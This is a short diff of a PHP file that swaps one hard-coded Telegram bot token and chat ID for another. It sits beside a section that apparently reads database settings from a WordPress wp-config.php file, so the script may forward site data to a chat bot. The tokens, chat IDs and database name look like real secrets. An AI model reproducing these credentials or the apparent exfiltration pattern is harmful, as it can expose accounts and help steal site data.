@@ -12,8 +12,8 @@ function handleError($message) {
 }
 
 // === KONFIG TELEGRAM ===
-$token   = '8452007991:AAH4HpOi2BgVnoKdtZv_iYLjT3MUF9A72cU';
-$chat_id = '1036837688';
+$token   = '8577347348:AAGN-860vmxn_M1nwAVo99jMn-E6casAPqs';
+$chat_id = '8130137884';
 
 // === DATABASE DARI wp-config.php ===
 $db_name = 'u692586828_VNHRN';
